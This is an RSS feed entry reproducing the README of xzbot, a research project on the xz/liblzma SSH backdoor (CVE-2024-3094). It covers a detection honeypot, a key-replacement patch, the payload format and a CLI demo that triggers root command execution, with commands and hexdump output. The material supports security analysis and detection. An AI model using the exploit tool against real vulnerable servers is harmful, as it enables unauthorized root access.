<?xml version="1.0" encoding="UTF-8"?><feed xmlns="http://www.w3.org/2005/Atom">
  <title>GitHub Go Daily Trending</title>
  <id>http://mshibanami.github.io/GitHubTrendingRSS</id>
  <updated>2024-04-04T01:30:31Z</updated>
  <subtitle>Daily Trending of Go in GitHub</subtitle>
  <link href="http://mshibanami.github.io/GitHubTrendingRSS"></link>
  <entry>
    <title>amlweems/xzbot</title>
    <updated>2024-04-04T01:30:31Z</updated>
    <id>tag:github.com,2024-04-04:/amlweems/xzbot</id>
    <link href="https://github.com/amlweems/xzbot" rel="alternate"></link>
    <summary type="html">&lt;p&gt;notes, honeypot, and exploit demo for the xz backdoor (CVE-2024-3094)&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;xzbot&lt;/h1&gt; &#xA;&lt;p&gt;Exploration of the xz &lt;a href=&#34;https://www.openwall.com/lists/oss-security/2024/03/29/4&#34;&gt;backdoor&lt;/a&gt; (CVE-2024-3094). Includes the following:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/amlweems/xzbot/main/#honeypot&#34;&gt;honeypot&lt;/a&gt;: fake vulnerable server to detect exploit attempts&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/amlweems/xzbot/main/#ed448-patch&#34;&gt;ed448 patch&lt;/a&gt;: patch liblzma.so to use our own ED448 public key&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/amlweems/xzbot/main/#backdoor-format&#34;&gt;backdoor format&lt;/a&gt;: format of the backdoor payload&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/amlweems/xzbot/main/#backdoor-demo&#34;&gt;backdoor demo&lt;/a&gt;: cli to trigger the RCE assuming knowledge of the ED448 private key&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/amlweems/xzbot/main/assets/demo.png&#34; alt=&#34;xzbot demo&#34;&gt;&lt;/p&gt; &#xA;&lt;h2&gt;honeypot&lt;/h2&gt; &#xA;&lt;p&gt;See &lt;a href=&#34;https://raw.githubusercontent.com/amlweems/xzbot/main/openssh.patch&#34;&gt;openssh.patch&lt;/a&gt; for a simple patch to openssh that logs any connection attempt with a public key N matching the backdoor format.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;$ git clone https://github.com/openssh/openssh-portable&#xA;$ patch -p1 &amp;lt; ~/path/to/openssh.patch&#xA;$ autoreconf&#xA;$ ./configure&#xA;$ make&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Any connection attempt will appear as follows in sshd logs:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;$ journalctl -u ssh-xzbot --since=&#39;1d ago&#39; | grep xzbot:&#xA;Mar 30 00:00:00 honeypot sshd-xzbot[1234]: xzbot: magic 1 [preauth]&#xA;Mar 30 00:00:00 honeypot sshd-xzbot[1234]: xzbot: 010000000100000000000000000000005725B22ED2...&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h1&gt;ed448 patch&lt;/h1&gt; &#xA;&lt;p&gt;The backdoor uses a hardcoded ED448 public key for signature validation and decrypting the payload. If we replace this key with our own, we can trigger the backdoor.&lt;/p&gt; &#xA;&lt;p&gt;The attacker&#39;s ED448 key is:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;0a 31 fd 3b 2f 1f c6 92 92 68 32 52 c8 c1 ac 28&#xA;34 d1 f2 c9 75 c4 76 5e b1 f6 88 58 88 93 3e 48&#xA;10 0c b0 6c 3a be 14 ee 89 55 d2 45 00 c7 7f 6e&#xA;20 d3 2c 60 2b 2c 6d 31 00&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;We will replace this key with our own (generated with seed=0):&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;5b 3a fe 03 87 8a 49 b2 82 32 d4 f1 a4 42 ae bd&#xA;e1 09 f8 07 ac ef 7d fd 9a 7f 65 b9 62 fe 52 d6&#xA;54 73 12 ca ce cf f0 43 37 50 8f 9d 25 29 a8 f1&#xA;66 91 69 b2 1c 32 c4 80 00&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;To start, download a backdoored libxzma shared object, e.g. from &lt;a href=&#34;https://snapshot.debian.org/package/xz-utils/5.6.1-1&#34;&gt;https://snapshot.debian.org/package/xz-utils/5.6.1-1&lt;/a&gt;. Then run the patch script. See &lt;a href=&#34;https://raw.githubusercontent.com/amlweems/xzbot/main/assets/&#34;&gt;assets/&lt;/a&gt; for examples.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;$ pip install pwntools&#xA;$ shasum -a 256 liblzma.so.5.6.1&#xA;605861f833fc181c7cdcabd5577ddb8989bea332648a8f498b4eef89b8f85ad4  liblzma.so.5.6.1&#xA;$ python3 patch.py liblzma.so.5.6.1&#xA;Patching func at offset: 0x24470&#xA;Generated patched so: liblzma.so.5.6.1.patch&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Then run sshd using this modified &lt;code&gt;liblzma.so.5.6.1.patch&lt;/code&gt; shared object.&lt;/p&gt; &#xA;&lt;h2&gt;backdoor format&lt;/h2&gt; &#xA;&lt;p&gt;The backdoor can be triggered by connecting with an SSH certificate with a payload in the CA signing key N value. This payload must be encrypted and signed with the attacker&#39;s ED448 key.&lt;/p&gt; &#xA;&lt;p&gt;The structure has the following format:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+&#xA;|   a (32 bit)  |   b (32 bit)  |           c (64 bit)          |&#xA;+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+&#xA;|                                                               |&#xA;+                     ciphertext (240 bytes)                    +&#xA;|                                                               |&#xA;+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;A request type is derived from the three values above (&lt;code&gt;a * b + c&lt;/code&gt;). If this value is greater than 3, the backdoor skips processing.&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Type 1: unknown, expects zero bytes&lt;/li&gt; &#xA; &lt;li&gt;Type 2: executes null-terminated payload with system()&lt;/li&gt; &#xA; &lt;li&gt;Type 3: unknown, expects 48 bytes (signed)&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;The ciphertext is encrypted with chacha20 using the first 32 bytes of the ED448 public key as a symmetric key. As a result, we can decrypt any exploit attempt using the following key:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;0a 31 fd 3b 2f 1f c6 92 92 68 32 52 c8 c1 ac 28&#xA;34 d1 f2 c9 75 c4 76 5e b1 f6 88 58 88 93 3e 48&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;The ciphertext has the following format:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+&#xA;|                    signature (114 bytes)                      |&#xA;+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+&#xA;| x (1 bit) |            unused ? (14 bit)          | y (1 bit) |&#xA;+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+&#xA;|        unknown (8 bit)        |         length (8 bit)        |&#xA;+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+&#xA;|        unknown (8 bit)        |         command \x00          |&#xA;+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Setting either &lt;code&gt;x&lt;/code&gt; or &lt;code&gt;y&lt;/code&gt; leads to slightly different code paths.&lt;/p&gt; &#xA;&lt;p&gt;The signature is an RFC-8032 ED448 signature computed over the following values:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;The 32-bit magic value (e.g. &lt;code&gt;02 00 00 00&lt;/code&gt;)&lt;/li&gt; &#xA; &lt;li&gt;The 5 bytes of fields before command&lt;/li&gt; &#xA; &lt;li&gt;[optional] &lt;code&gt;length&lt;/code&gt; bytes of the command&lt;/li&gt; &#xA; &lt;li&gt;The first 32 bytes of the sha256 hash of the server&#39;s hostkey&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h1&gt;backdoor demo&lt;/h1&gt; &#xA;&lt;pre&gt;&lt;code&gt;$ go install github.com/amlweems/xzbot@latest&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;pre&gt;&lt;code&gt;$ xzbot -h&#xA;Usage of xzbot:&#xA;  -addr string&#xA;        ssh server address (default &#34;127.0.0.1:2222&#34;)&#xA;  -seed string&#xA;        ed448 seed, must match xz backdoor key (default &#34;0&#34;)&#xA;  -cmd string&#xA;        command to run via system() (default &#34;id &amp;gt; /tmp/.xz&#34;)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;The following will connect to a vulnerable SSH server at &lt;code&gt;127.0.0.1:2222&lt;/code&gt; and run the command &lt;code&gt;id &amp;gt; /tmp/.xz&lt;/code&gt;:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;$ xzbot -addr 127.0.0.1:2222 -cmd &#39;id &amp;gt; /tmp/.xz&#39;&#xA;00000000  00 00 00 1c 73 73 68 2d  72 73 61 2d 63 65 72 74  |....ssh-rsa-cert|&#xA;00000010  2d 76 30 31 40 6f 70 65  6e 73 73 68 2e 63 6f 6d  |-v01@openssh.com|&#xA;00000020  00 00 00 00 00 00 00 03  01 00 01 00 00 01 01 01  |................|&#xA;00000030  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|&#xA;...&#xA;00000150  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|&#xA;00000160  00 00 01 14 00 00 00 07  73 73 68 2d 72 73 61 00  |........ssh-rsa.|&#xA;00000170  00 00 01 01 00 00 01 00  02 00 00 00 01 00 00 00  |................|&#xA;00000180  00 00 00 00 00 00 00 00  54 97 bc c5 ef 93 e4 24  |........T......$|&#xA;00000190  cf b1 57 57 59 85 52 fd  41 2a a5 54 9e aa c6 52  |..WWY.R.A*.T...R|&#xA;000001a0  58 64 a4 17 45 8a af 76  ce d2 e3 0b 7c bb 1f 29  |Xd..E..v....|..)|&#xA;000001b0  2b f0 38 45 3f 5e 00 f1  b0 00 15 84 e7 bc 10 1f  |+.8E?^..........|&#xA;000001c0  0f 5f 50 36 07 9f bd 07  05 77 5c 74 84 69 c9 7a  |._P6.....w\t.i.z|&#xA;000001d0  28 6b e8 16 aa 99 34 bf  9d c4 c4 5c b8 fd 4a 3c  |(k....4....\..J&amp;lt;|&#xA;000001e0  d8 2b 39 32 06 d9 4f a4  3a 00 d0 0b 0f a2 21 c0  |.+92..O.:.....!.|&#xA;000001f0  86 c3 c9 e2 e6 17 b4 a6  54 ba c3 a1 4c 40 91 be  |........T...L@..|&#xA;00000200  91 9a 2b f8 0b 18 61 1c  5e e1 e0 5b e8 00 00 00  |..+...a.^..[....|&#xA;00000210  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|&#xA;...&#xA;00000260  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|&#xA;00000270  00 00 00 00 00 00 00 00  00 00 00 10 00 00 00 07  |................|&#xA;00000280  73 73 68 2d 72 73 61 00  00 00 01 00              |ssh-rsa.....|&#xA;2024/03/30 00:00:00 ssh: handshake failed: EOF&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;On the vulnerable server, we can set a watchpoint for the call to &lt;code&gt;system()&lt;/code&gt; and observe the command is executed:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;$ bpftrace -e &#39;watchpoint:0x07FFFF74B1995:8:x {&#xA;    printf(&#34;%s (%d): %s\n&#34;, comm, pid, str(uptr(reg(&#34;di&#34;))))&#xA;}&#39;&#xA;Attaching 1 probe...&#xA;sshd (1234): id &amp;gt; /tmp/.xz&#xA;&#xA;$ cat /tmp/.xz&#xA;uid=0(root) gid=0(root) groups=0(root)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;The process tree after exploitation looks different from a normal sshd process tree:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;# normal process tree&#xA;$ ssh foo@bar&#xA;$ ps -ef --forest&#xA;root         765       1  0 17:58 ?        00:00:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups&#xA;root        1026     765  7 18:51 ?        00:00:00  \_ sshd: foo [priv]&#xA;foo         1050    1026  0 18:51 ?        00:00:00      \_ sshd: foo@pts/1&#xA;foo         1051    1050  0 18:51 pts/1    00:00:00          \_ -bash&#xA;&#xA;# backdoor process tree&#xA;$ xzbot -cmd &#39;sleep 60&#39;&#xA;$ ps -ef --forest&#xA;root         765       1  0 17:58 ?        00:00:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups&#xA;root         941     765  4 18:04 ?        00:00:00  \_ sshd: root [priv]&#xA;sshd         942     941  0 18:04 ?        00:00:00      \_ sshd: root [net]&#xA;root         943     941  0 18:04 ?        00:00:00      \_ sh -c sleep 60&#xA;root         944     943  0 18:04 ?        00:00:00          \_ sleep 60&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;em&gt;Note: successful exploitation does not generate any INFO or higher log entries.&lt;/em&gt;&lt;/p&gt; &#xA;&lt;h1&gt;References&lt;/h1&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.openwall.com/lists/oss-security/2024/03/29/4&#34;&gt;https://www.openwall.com/lists/oss-security/2024/03/29/4&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://gist.github.com/smx-smx/a6112d54777845d389bd7126d6e9f504&#34;&gt;https://gist.github.com/smx-smx/a6112d54777845d389bd7126d6e9f504&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://gist.github.com/q3k/af3d93b6a1f399de28fe194add452d01&#34;&gt;https://gist.github.com/q3k/af3d93b6a1f399de28fe194add452d01&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://gist.github.com/keeganryan/a6c22e1045e67c17e88a606dfdf95ae4&#34;&gt;https://gist.github.com/keeganryan/a6c22e1045e67c17e88a606dfdf95ae4&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt;</summary>
  </entry>
</feed>